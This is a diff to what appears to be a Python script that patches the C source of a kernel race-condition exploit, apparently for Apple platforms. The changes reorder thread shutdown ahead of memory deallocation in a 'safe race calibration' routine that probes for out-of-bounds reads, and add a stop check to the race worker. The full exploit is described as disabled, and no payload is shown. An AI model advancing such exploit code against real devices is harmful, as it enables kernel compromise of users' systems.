@@ -104,6 +104,13 @@ static int paleramine_safe_race_calibration(void)
               successReadCount > 0 ? "race produced at least one OOB read" : "zero OOB reads; full exploit remains disabled");
 
 calibration_cleanup:
+    // Stop and join the race worker while every referenced object is still valid.
+    goSync = 0;
+    raceSync = 1;
+    if (freeThreadStart != 0) {
+        pthread_join(freeThread, NULL);
+    }
+
     if (calibrationAddress != 0) {
         surface_munlock(calibrationAddress, calibrationSize);
     }
@@ -112,12 +119,6 @@ calibration_cleanup:
     }
     if (calibrationAddress != 0) {
         mach_vm_deallocate(mach_task_self(), calibrationAddress, calibrationSize);
-    }
-
-    goSync = 0;
-    raceSync = 1;
-    if (freeThreadStart != 0) {
-        pthread_join(freeThread, NULL);
     }
     if (pcAddress != 0 && pcSize != 0) {
         mach_vm_deallocate(mach_task_self(), pcAddress, pcSize);
@@ -136,6 +137,13 @@ calibration_cleanup:
 }
 
 '''
+
+ds = replace_once(
+    ds,
+    '        while (raceSync == 0);\n\n        kern_return_t kr = mach_vm_map(',
+    '        while (raceSync == 0);\n        if (goSync == 0) break;\n\n        kern_return_t kr = mach_vm_map(',
+    "race worker stop check",
+)
 
 ds = replace_once(
     ds,
